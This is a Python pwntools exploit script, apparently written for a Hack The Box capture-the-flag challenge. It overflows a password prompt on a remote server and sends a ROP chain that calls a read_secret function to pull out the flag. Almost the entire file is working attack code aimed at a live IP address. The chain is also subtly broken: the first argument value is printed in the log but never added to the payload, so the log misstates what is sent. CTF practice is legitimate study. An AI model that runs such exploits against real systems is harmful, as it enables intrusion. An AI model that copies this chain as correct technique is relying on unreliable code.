#!/usr/bin/env python3

from pwn import *

# Configuración
context.arch = 'amd64'
context.log_level = 'info'

def exploit_remote():
    print("[+] Connecting to remote server...")
    
    read_secret_addr = 0x4014bd
    pop_rdi_ret = 0x4017db  
    pop_rsi_ret = 0x4017dd  
    
    val1 = 0xdeadbeef  
    val2 = 0x1337c0de 
    
    # Conectar al servidor remoto
    try:
        proc = remote('94.237.122.241', 41316)
    except Exception as e:
        print(f"[-] Error connecting to remote server: {e}")
        return
    

    proc.recvuntil(b'>> ')
    
    proc.sendline(b'2')
    
    proc.recvuntil(b'Insert password: ')
    

    payload = b'A' * 32 
    payload += b'B' * 8   
    
  
    payload += p64(pop_rdi_ret)    
    payload += p64(pop_rsi_ret)   
    payload += p64(val2)           
    payload += p64(read_secret_addr) 
    
    print(f"[+] Sending payload of length: {len(payload)}")
    print(f"[+] ROP chain:")
    print(f"    pop rdi ; ret: {hex(pop_rdi_ret)}")
    print(f"    val1 (rdi): {hex(val1)}")
    print(f"    pop rsi ; ret: {hex(pop_rsi_ret)}")
    print(f"    val2 (rsi): {hex(val2)}")
    print(f"    read_secret: {hex(read_secret_addr)}")
    
    proc.send(payload)
    
  
    try:
        response = proc.recvall(timeout=10)
        print(f"[+] Response: {response}")
        
       
        if b"HTB{" in response:
            flag_start = response.find(b"HTB{")
            flag_end = response.find(b"}", flag_start) + 1
            flag = response[flag_start:flag_end]
            print(f"\n[+] *** FLAG FOUND *** : {flag.decode()}")
            print(f"[+] *** FLAG *** : {flag.decode()}")
            return flag.decode()
        else:
            print("[-] No flag found in response")
           
            print(f"[DEBUG] Response hex: {response.hex()}")
            
    except EOFError:
        print("[-] Process ended unexpectedly")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    proc.close()
    return None

if __name__ == "__main__":
    flag = exploit_remote()
    if flag:
        print(f"\n FINAL FLAG: {flag} ")
    else:
        print("\n Failed to get flag")
